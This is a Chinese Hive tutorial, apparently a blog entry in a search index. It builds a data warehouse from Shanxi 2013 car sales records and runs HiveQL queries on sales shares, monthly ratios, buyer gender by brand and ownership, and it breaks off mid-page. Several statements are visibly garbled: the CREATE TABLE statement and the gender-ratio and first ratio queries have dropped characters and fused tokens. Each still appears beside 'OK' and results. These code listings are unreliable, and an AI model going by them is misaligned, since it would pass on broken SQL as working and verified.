<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>(Hive)汽车销售数据分析系统实战开发</title>
      <link href="/2021/12/04/Hive%E5%AD%A6%E4%B9%A0/Hive9/"/>
      <url>/2021/12/04/Hive%E5%AD%A6%E4%B9%A0/Hive9/</url>
      
        <content type="html"><![CDATA[<p>本章围绕乘用车辆和商用车辆销售数据展开，通过 Hive 构建数据仓库，实现对汽车销售数据各项指标进行立体化分析。</p><h2 id="数据概况"><a class="markdownIt-Anchor" href="#数据概况">#</a> 数据概况</h2><p>项目的数据来源于一个真实项目，数据项包括<br> “省，月，市，区县，年，车辆型号，制造商，品牌，车辆类型，所有权，使用性质，数量，发动机型号，排量，功率，燃料种类，车长，车宽，车高，厢长，厢宽，厢高，轴数，轴距，前轮距，轮胎规格，轮胎数，总质量，整备质量，核定载质量，核定载客，准牵引质量，底盘企业，底盘品牌，底盘型号，发动机企业，车辆名称，年龄，性别”。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">山西省,3,朔州市,朔城区,2013,LZW6450PF,上汽通用五菱汽车股份有限公司,五菱,小型普通客车,个人,非营运,1,L3C,8424,79,汽油,4490,1615,1900,10,45,26,2,3050,1386,175/70R14LT,4,2110,1275,,7,,,,,上汽通用五菱汽车股份有限公司,客车,1913,男性</span><br></pre></td></tr></table></figure><h2 id="项目实战"><a class="markdownIt-Anchor" href="#项目实战">#</a> 项目实战</h2><p>本节内容包括构建数据仓库、创建原始数据表、加载数据到数据仓库、验证数据结果以及具体的项目需求、设计思路、HiveSQL 设计以及 HiveSQL 运行结果等内容。</p><h3 id="构建数据仓库"><a class="markdownIt-Anchor" href="#构建数据仓库">#</a> 构建数据仓库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hive (<span class="keyword">default</span>)<span class="operator">&gt;</span> <span class="keyword">create</span> database if <span class="keyword">not</span> <span class="keyword">exists</span> cars;</span><br><span class="line">OK</span><br><span class="line"><span class="type">Time</span> taken: <span class="number">7.501</span> seconds</span><br><span class="line"></span><br><span class="line">hive (<span class="keyword">default</span>)<span class="operator">&gt;</span> use cars;</span><br><span class="line">OK</span><br><span class="line"><span class="type">Time</span> taken: <span class="number">0.082</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="创建原始数据表"><a class="markdownIt-Anchor" href="#创建原始数据表">#</a> 创建原始数据表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">external</span> <span class="keyword">table</span> car_2019712(province string comment <span class="string">&#x27;省&#x27;</span>, <span class="keyword">month</span> <span class="type">int</span> commet <span class="string">&#x27;月&#x27;</span>, city string comment <span class="string">&#x27;市&#x27;</span>, district string comment <span class="string">&#x27;区县&#x27;</span>, <span class="keyword">year</span> <span class="type">int</span> comment <span class="string">&#x27;年&#x27;</span>, modring comment <span class="string">&#x27;车辆型号&#x27;</span>, manufacturer string comment <span class="string">&#x27;制造商&#x27;</span>, brand string comment <span class="string">&#x27;品牌&#x27;</span>, pe string comment <span class="string">&#x27;车辆类型&#x27;</span>, ownership string comment <span class="string">&#x27;所有权&#x27;</span>,nature string comment <span class="string">&#x27;使用ity int comment &#x27;</span>数量<span class="string">&#x27;, enginemodel string comment &#x27;</span>发动</span><br><span class="line">           <span class="operator">&gt;</span> 机型号<span class="string">&#x27;, displacement int comment &#x27;</span>排量<span class="string">&#x27;, power int comment &#x27;</span>功率<span class="string">&#x27;, fuel stringt &#x27;</span>燃料种类<span class="string">&#x27;, length1 int comment &#x27;</span>车长<span class="string">&#x27;, width1 int comment &#x27;</span>车宽<span class="string">&#x27;, height1 int comment &#x27;</span>车h2 <span class="type">int</span> comment <span class="string">&#x27;厢长&#x27;</span>, width2 <span class="type">int</span> comment <span class="string">&#x27;厢宽&#x27;</span>, height2 <span class="type">int</span> comment <span class="string">&#x27;厢高&#x27;</span>, numberofaxles mment <span class="string">&#x27;轴数&#x27;</span>, wheelbase <span class="type">int</span> comment <span class="string">&#x27;轴距&#x27;</span>, frontwheelbase <span class="type">int</span> comment <span class="string">&#x27;前轮距&#x27;</span>, tirespecifistring comment <span class="string">&#x27;轮胎规格&#x27;</span>, tirenumber <span class="type">int</span> comment <span class="string">&#x27;轮胎数&#x27;</span>, totalquality <span class="type">int</span> comment <span class="string">&#x27;总质量equality int comment &#x27;</span>整备质量<span class="string">&#x27;, approvedquality int comment &#x27;</span>核定载质量<span class="string">&#x27;, approvedpassengeromment &#x27;</span>核定载客<span class="string">&#x27;, tractionquality int comment &#x27;</span>准牵引质量<span class="string">&#x27;, chassisenterprise string commen chassisbrand string comment &#x27;</span>底盘品牌<span class="string">&#x27;, chassismodel string comment &#x27;</span>底盘型号<span class="string">&#x27;, engineenterring comment &#x27;</span>发动机企业<span class="string">&#x27;, vehiclename string comment &#x27;</span>车辆名称<span class="string">&#x27;, age int comment &#x27;</span>年龄<span class="string">&#x27;, ge comment &#x27;</span>性别<span class="string">&#x27;) comment &#x27;</span>this <span class="keyword">is</span> the raw data<span class="string">&#x27; row format delimited fields terminated by &#x27;</span>,location <span class="string">&#x27;/cars&#x27;</span>;</span><br><span class="line">OK</span><br><span class="line"><span class="type">Time</span> taken: <span class="number">0.766</span> seconds</span><br><span class="line"></span><br><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">desc</span> car_2019712;</span><br><span class="line">OK</span><br><span class="line">col_namedata_typecomment</span><br><span class="line">province            string              ?                   </span><br><span class="line"><span class="keyword">month</span>               <span class="type">int</span>                 ?                   </span><br><span class="line">city                string              ?                   </span><br><span class="line">district            string              ??                  </span><br><span class="line"><span class="keyword">year</span>                <span class="type">int</span>                 ?   </span><br><span class="line">···</span><br></pre></td></tr></table></figure><h3 id="加载数据到数据仓库"><a class="markdownIt-Anchor" href="#加载数据到数据仓库">#</a> 加载数据到数据仓库</h3><ol><li>在 HDFS 上创建存放数据的目录 /cars，如果 /cars 已存在，则无需创建</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]# hadoop fs -ls /</span><br><span class="line">Found 6 items</span><br><span class="line">drwxr-xr-x   - root   supergroup          0 2021-12-04 17:54 /cars</span><br></pre></td></tr></table></figure><ol start="2"><li>将数据文档 cars.csv 利用 Xshell 上传到 master 的 /root 中</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]# ll</span><br><span class="line">总用量 171488</span><br><span class="line">-rw-r--r--. 1 root root  20702466 12月  4 18:02 cars.csv</span><br></pre></td></tr></table></figure><ol start="3"><li>用 Hadoop 命令行方式将数据加载到 Hive 数据仓库监控的目录中</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@master ~]# hadoop fs -put /root/cars.csv /cars</span><br></pre></td></tr></table></figure><h3 id="验证数据结果"><a class="markdownIt-Anchor" href="#验证数据结果">#</a> 验证数据结果</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> cars.car_2019712 limit <span class="number">3</span>;</span><br><span class="line">OK</span><br><span class="line">car_2019712.provincecar_2019712.monthcar_2019712.citycar_2019712.districcar_2019712.yearcar_2019712.modelcar_2019712.manufacturercar_2019712.brand  car_2019712.vehicletypecar_2019712.ownershipcar_2019712.naturecar_2019712.quantitcar_2019712.enginemodelcar_2019712.displacementcar_2019712.powercar_2019712.fuelcar_2019712.length1car_2019712.width1car_2019712.height1car_2019712.length2car_2019712.width2car_2019712.height2car_2019712.numberofaxlescar_2019712.wheelbasecar_2019712.frontwheelbasecar_2019712.tirespecificationcar_2019712.tirenumbercar_2019712.totalqualitycar_2019712.completequalitycar_2019712.approvedqualitycar_2019712.approvedpassengercar_2019712.tractionqualitycar_2019712.chassisenterprisecar_2019712.chassisbrandcar_2019712.chassismodel   car_2019712.engineenterprisecar_2019712.vehiclenamecar_2019712.agecar_2019712.gender</span><br><span class="line">山西省<span class="number">3</span>朔州市朔城区<span class="number">2013</span>LZW6450PF上汽通用五菱汽车股份有限公司五菱小型普通客车个人非营运<span class="number">1</span>L3C<span class="number">8424</span><span class="number">79</span>汽油<span class="number">4490</span><span class="number">1615</span><span class="number">19010</span><span class="number">45</span><span class="number">26</span><span class="number">2</span><span class="number">3050</span><span class="number">1386</span><span class="number">175</span><span class="operator">/</span><span class="number">70</span>R14LT<span class="number">4</span><span class="number">2110</span><span class="number">1275</span>NULNULL上汽通用五菱汽车股份有限公司客车<span class="number">1913</span>男性</span><br><span class="line">山西省<span class="number">3</span>晋城市城区<span class="number">2013</span>EQ6450PF1东风小康汽车有限公司东风小型普通客车个人非营运<span class="number">1</span>DK13<span class="number">-06</span><span class="number">1587</span><span class="number">74</span>汽油<span class="number">4500</span><span class="number">1680</span><span class="number">19610</span><span class="number">45</span><span class="number">26</span><span class="number">2</span><span class="number">3050</span><span class="number">1435</span><span class="number">185</span>R14LT <span class="number">6</span>PR<span class="number">4</span><span class="number">1970</span><span class="number">1290</span>NULNULL东风小康汽车有限公司EQ6440KMF重庆渝安淮海动力有限公司客<span class="number">.1929</span>男性</span><br><span class="line">山西省<span class="number">12</span>长治市长治城区<span class="number">2013</span>BJ6440BKV1A北汽银翔汽车有限公司北京小型普通客车个人非营运<span class="number">1</span>BJ415A<span class="number">1500</span><span class="number">75</span><span class="number">4440</span><span class="keyword">NULL</span>NUL10<span class="number">45</span><span class="number">26</span><span class="keyword">NULL</span><span class="keyword">NULL</span><span class="keyword">NULL</span><span class="keyword">NULL</span><span class="keyword">NULL</span><span class="keyword">NULL</span><span class="keyword">NULL</span>   <span class="keyword">NULL</span>北汽银翔汽车有限公司北京BJ6440BKV1A北汽银翔汽车有限公司<span class="number">1938</span>男性</span><br><span class="line"><span class="type">Time</span> taken: <span class="number">2.895</span> seconds, Fetched: <span class="number">3</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure><h3 id="统计乘用车辆和商用车辆的销售数量和销售数量占比"><a class="markdownIt-Anchor" href="#统计乘用车辆和商用车辆的销售数量和销售数量占比">#</a> 统计乘用车辆和商用车辆的销售数量和销售数量占比</h3><ol><li>根据字段 “nature” 即 “使用性质” 来分组统计乘用车辆和商用车辆的总数量，乘用车辆的使用性质为 “非营运”，商用车辆的使用性质为 “营运”</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="string">&#x27;非营运&#x27;</span>, <span class="built_in">sum</span>(if(a.nature<span class="operator">=</span><span class="string">&#x27;非营运&#x27;</span>,a.cnt,<span class="number">0</span>)),<span class="string">&#x27;营运&#x27;</span>,<span class="built_in">sum</span>(if(a.nature<span class="operator">!=</span><span class="string">&#x27;非t,0)) from (select nature, count(*) as cnt from cars.car_2019712 group by nature having nature is not null and nature!=&#x27;&#x27;) a;</span></span><br><span class="line"><span class="string">Job running in-process (local Hadoop)</span></span><br><span class="line"><span class="string">2021-12-04 18:06:17,810 Stage-1 map = 100%,  reduce = 0%</span></span><br><span class="line"><span class="string">2021-12-04 18:06:18,832 Stage-1 map = 100%,  reduce = 100%</span></span><br><span class="line"><span class="string">Ended Job = job_local1330125293_0001</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">_c0_c1_c2_c3</span></span><br><span class="line"><span class="string">非营运66478营运3884</span></span><br><span class="line"><span class="string">Time taken: 6.564 seconds, Fetched: 1 row(s)</span></span><br></pre></td></tr></table></figure><ol start="2"><li>统计出汽车销售总数量</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> cars.car_2019712;</span><br><span class="line">Job <span class="keyword">running</span> <span class="keyword">in</span><span class="operator">-</span>process (<span class="keyword">local</span> Hadoop)</span><br><span class="line"><span class="number">2021</span><span class="number">-12</span><span class="number">-04</span> <span class="number">18</span>:<span class="number">07</span>:<span class="number">45</span>,<span class="number">241</span> Stage<span class="number">-1</span> map <span class="operator">=</span> <span class="number">100</span><span class="operator">%</span>,  reduce <span class="operator">=</span> <span class="number">100</span><span class="operator">%</span></span><br><span class="line">Ended Job <span class="operator">=</span> job_local445756713_0003</span><br><span class="line">OK</span><br><span class="line">_c0</span><br><span class="line"><span class="number">70640</span></span><br></pre></td></tr></table></figure><ol start="3"><li>计算乘用车辆的销售数量占比<br>（66478/70640)*100%=94.1%</li><li>计算商用车辆的销售数量占比<br>（3884/70640)*100%=5.5%<br> 还有 0.4% 属于其他类型的车辆</li></ol><h3 id="统计山西省2013年每个月的汽车销售数量的比例"><a class="markdownIt-Anchor" href="#统计山西省2013年每个月的汽车销售数量的比例">#</a> 统计山西省 2013 年每个月的汽车销售数量的比例</h3><p>分别统计出山西省 2013 年每个月的汽车销售数量和山西省 2013 年年度汽车销售总数量，再用 2013 年每个月的汽车销售数量除以年度汽车销售总数量。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">set</span> hive.strict.checks.cartesian.product<span class="operator">=</span><span class="literal">false</span>;</span><br><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">month</span>,c1.ss<span class="operator">/</span>c2.sumshu <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">month</span>, <span class="built_in">sum</span>(quantity) <span class="keyword">as</span> ss <span class="keyword">from</span> cars.car_2019712 <span class="keyword">where</span> province<span class="operator">=</span><span class="string">&#x27;山西省&#x27;</span> <span class="keyword">and</span> <span class="keyword">year</span><span class="operator">=</span><span class="string">&#x27;2013&#x27;</span> <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">month</span>) c1, (<span class="keyword">select</span> <span class="built_in">sum</span>(quantity) <span class="keyword">as</span> sumshu <span class="keyword">from</span> cars.car_2019712 <span class="keyword">where</span> province<span class="operator">=</span><span class="string">&#x27;山西省&#x27;</span> <span class="keyword">and</span> <span class="keyword">year</span><span class="operator">=</span><span class="string">&#x27;2013&#x27;</span>) c2;</span><br><span class="line">MapReduce Jobs Launched: </span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-1</span>:  HDFS Read: <span class="number">124235252</span> HDFS Write: <span class="number">12420</span> SUCCESS</span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-3</span>:  HDFS Read: <span class="number">165660827</span> HDFS Write: <span class="number">39149</span> SUCCESS</span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-4</span>:  HDFS Read: <span class="number">82838654</span> HDFS Write: <span class="number">25114</span> SUCCESS</span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line"><span class="keyword">month</span>_c1</span><br><span class="line"><span class="number">1</span><span class="number">0.14799181376311077</span></span><br><span class="line"><span class="number">2</span><span class="number">0.05831272561894204</span></span><br><span class="line"><span class="number">3</span><span class="number">0.09306159574770473</span></span><br><span class="line"><span class="number">4</span><span class="number">0.06587362496802251</span></span><br><span class="line"><span class="number">5</span><span class="number">0.0732071288479577</span></span><br><span class="line"><span class="number">6</span><span class="number">0.05547028225462608</span></span><br><span class="line"><span class="number">7</span><span class="number">0.06323015263920867</span></span><br><span class="line"><span class="number">8</span><span class="number">0.06378442909525028</span></span><br><span class="line"><span class="number">9</span><span class="number">0.06948352804070379</span></span><br><span class="line"><span class="number">10</span><span class="number">0.1044882180722549</span></span><br><span class="line"><span class="number">11</span><span class="number">0.10053722179585571</span></span><br><span class="line"><span class="number">12</span><span class="number">0.1045592791563628</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">24.092</span> seconds, Fetched: <span class="number">12</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure><h3 id="统计买车的男女比例及男女对车的品牌的选择"><a class="markdownIt-Anchor" href="#统计买车的男女比例及男女对车的品牌的选择">#</a> 统计买车的男女比例及男女对车的品牌的选择</h3><p>分别统计出买车的男性人数、女性人数和总人数，再分别用男性人数和女性人数除以购车总人数。</p><ol><li>统计买车的男性占比和女性占比</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="string">&#x27;男性&#x27;</span>, a.nan<span class="operator">*</span><span class="number">1.0</span><span class="operator">/</span>(a.nan<span class="operator">+</span>a.nv),<span class="string">&#x27;女性&#x27;</span>, a.nv<span class="operator">*</span><span class="number">1.0</span><span class="operator">/</span>(a.nan<span class="operator">+</span>a.nv) <span class="keyword">from</span> (selec性<span class="string">&#x27;, sum(if(b.gender=&#x27;</span>男性<span class="string">&#x27;,b.cnt,0)) as nan, &#x27;</span>女性<span class="string">&#x27;, sum(if(b.gender=&#x27;</span>女性<span class="string">&#x27;,b.cnt,0)) as nvselect gender, count(*) as cnt from cars.car_2019712 group by gender having gender is not null and gender!= &#x27;&#x27;) b)a;</span></span><br><span class="line"><span class="string">MapReduce Jobs Launched: </span></span><br><span class="line"><span class="string">Stage-Stage-1:  HDFS Read: 207083230 HDFS Write: 50347 SUCCESS</span></span><br><span class="line"><span class="string">Stage-Stage-2:  HDFS Read: 207092711 HDFS Write: 64901 SUCCESS</span></span><br><span class="line"><span class="string">Total MapReduce CPU Time Spent: 0 msec</span></span><br><span class="line"><span class="string">OK</span></span><br><span class="line"><span class="string">_c0_c1_c2_c3</span></span><br><span class="line"><span class="string">男性0.70106593239522273女性0.29893406760477727</span></span><br><span class="line"><span class="string">Time taken: 4.188 seconds, Fetched: 1 row(s)</span></span><br></pre></td></tr></table></figure><ol start="2"><li>分析男性和女性对车的品牌的选择情况</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> gender,brand,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> cars.car_2019712 <span class="keyword">where</span> gender <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">and</span> gender<span class="operator">!=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> age <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">group</span> <span class="keyword">by</span> gender,brand <span class="keyword">having</span> brand <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span> <span class="keyword">and</span> brand<span class="operator">!=</span><span class="string">&#x27;&#x27;</span>;</span><br><span class="line">MapReduce Jobs Launched: </span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-1</span>:  HDFS Read: <span class="number">248503192</span> HDFS Write: <span class="number">68889</span> SUCCESS</span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line">genderbrand_c2</span><br><span class="line">女性一汽佳星<span class="number">1</span></span><br><span class="line">男性一汽佳星<span class="number">2</span></span><br><span class="line">女性东南<span class="number">1</span></span><br><span class="line">男性东南<span class="number">12</span></span><br><span class="line">女性东风<span class="number">1367</span></span><br><span class="line">男性东风<span class="number">3214</span></span><br><span class="line">女性中誉<span class="number">4</span></span><br><span class="line">男性中誉<span class="number">2</span></span><br><span class="line">男性中通<span class="number">1</span></span><br><span class="line">女性五菱<span class="number">12004</span></span><br><span class="line">男性五菱<span class="number">28208</span></span><br><span class="line">女性五菱宏光<span class="number">1057</span></span><br><span class="line">男性五菱宏光<span class="number">2331</span></span><br><span class="line">女性众泰<span class="number">2</span></span><br><span class="line">男性众泰<span class="number">6</span></span><br><span class="line">女性依维柯<span class="number">32</span></span><br><span class="line">男性依维柯<span class="number">64</span></span><br><span class="line">女性俊风<span class="number">1</span></span><br><span class="line">男性俊风<span class="number">4</span></span><br><span class="line">女性力帆<span class="number">27</span></span><br><span class="line">男性力帆<span class="number">84</span></span><br><span class="line">女性北京<span class="number">741</span></span><br><span class="line">男性北京<span class="number">1836</span></span><br><span class="line">男性合客<span class="number">2</span></span><br><span class="line">女性吉奥<span class="number">12</span></span><br><span class="line">男性吉奥<span class="number">30</span></span><br><span class="line">男性同心<span class="number">1</span></span><br><span class="line">女性哈飞<span class="number">4</span></span><br><span class="line">男性哈飞<span class="number">7</span></span><br><span class="line">女性大通<span class="number">7</span></span><br><span class="line">男性大通<span class="number">31</span></span><br><span class="line">女性大马<span class="number">3</span></span><br><span class="line">男性大马<span class="number">7</span></span><br><span class="line">女性奥路卡<span class="number">125</span></span><br><span class="line">男性奥路卡<span class="number">277</span></span><br><span class="line">女性宇通<span class="number">6</span></span><br><span class="line">男性宇通<span class="number">7</span></span><br><span class="line">女性少林<span class="number">28</span></span><br><span class="line">男性少林<span class="number">72</span></span><br><span class="line">女性尼桑<span class="number">2</span></span><br><span class="line">男性尼桑<span class="number">2</span></span><br><span class="line">女性开瑞<span class="number">89</span></span><br><span class="line">男性开瑞<span class="number">231</span></span><br><span class="line">女性恒通客车<span class="number">2</span></span><br><span class="line">男性恒通客车<span class="number">2</span></span><br><span class="line">女性昌河<span class="number">20</span></span><br><span class="line">男性昌河<span class="number">75</span></span><br><span class="line">女性昌河铃木<span class="number">3</span></span><br><span class="line">男性昌河铃木<span class="number">1</span></span><br><span class="line">女性松花江<span class="number">25</span></span><br><span class="line">男性松花江<span class="number">86</span></span><br><span class="line">男性柯斯达<span class="number">6</span></span><br><span class="line">男性梅赛德斯<span class="operator">-</span>奔驰<span class="number">1</span></span><br><span class="line">女性欧诺<span class="number">121</span></span><br><span class="line">男性欧诺<span class="number">239</span></span><br><span class="line">男性汇众<span class="number">3</span></span><br><span class="line">女性江淮<span class="number">7</span></span><br><span class="line">男性江淮<span class="number">13</span></span><br><span class="line">女性江铃全顺<span class="number">84</span></span><br><span class="line">男性江铃全顺<span class="number">200</span></span><br><span class="line">女性海格<span class="number">1</span></span><br><span class="line">男性海格<span class="number">1</span></span><br><span class="line">女性神剑<span class="number">6</span></span><br><span class="line">男性神剑<span class="number">16</span></span><br><span class="line">女性福田<span class="number">17</span></span><br><span class="line">男性福田<span class="number">49</span></span><br><span class="line">女性航天<span class="number">31</span></span><br><span class="line">男性航天<span class="number">93</span></span><br><span class="line">女性解放<span class="number">96</span></span><br><span class="line">男性解放<span class="number">242</span></span><br><span class="line">女性通家福<span class="number">5</span></span><br><span class="line">男性通家福<span class="number">19</span></span><br><span class="line">女性野马<span class="number">8</span></span><br><span class="line">男性野马<span class="number">20</span></span><br><span class="line">女性金旅<span class="number">7</span></span><br><span class="line">男性金旅<span class="number">6</span></span><br><span class="line">女性金杯<span class="number">102</span></span><br><span class="line">男性金杯<span class="number">265</span></span><br><span class="line">女性金龙<span class="number">16</span></span><br><span class="line">男性金龙<span class="number">26</span></span><br><span class="line">女性长城<span class="number">2</span></span><br><span class="line">男性长城<span class="number">18</span></span><br><span class="line">女性长安<span class="number">1628</span></span><br><span class="line">男性长安<span class="number">3679</span></span><br><span class="line">男性飞碟<span class="number">3</span></span><br><span class="line">男性黄海<span class="number">2</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">3.112</span> seconds, Fetched: <span class="number">86</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure><h3 id="统计车的所有权-车辆型号和车辆类型"><a class="markdownIt-Anchor" href="#统计车的所有权-车辆型号和车辆类型">#</a> 统计车的所有权、车辆型号和车辆类型</h3><ol><li>统计买车的所有权</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">hive (cars)<span class="operator">&gt;</span> <span class="keyword">select</span> ownership,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">as</span> cnt <span class="keyword">from</span> cars.car_2019712 <span class="keyword">group</span> <span class="keyword">by</span> ownership <span class="keyword">order</span> <span class="keyword">by</span> cnt <span class="keyword">desc</span>;</span><br><span class="line">MapReduce Jobs Launched: </span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-1</span>:  HDFS Read: <span class="number">289915770</span> HDFS Write: <span class="number">72901</span> SUCCESS</span><br><span class="line">Stage<span class="operator">-</span>Stage<span class="number">-2</span>:  HDFS Read: <span class="number">289923419</span> HDFS Write: <span class="number">83320</span> SUCCESS</span><br><span class="line">Total MapReduce CPU <span class="type">Time</span> Spent: <span class="number">0</span> msec</span><br><span class="line">OK</span><br><span class="line">ownershipcnt</span><br><span class="line">个人<span class="number">60745</span></span><br><span class="line">单位<span class="number">9617</span></span><br><span class="line"><span class="keyword">NULL</span><span class="number">273</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="type">Time</span> taken: <span class="number">4.611</span> seconds, Fetched: <span class="number">4</span> <span class="type">row</span>(s)</span><br></pre></td></tr></table></figure><ol start="2"><li>统计车辆型号</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 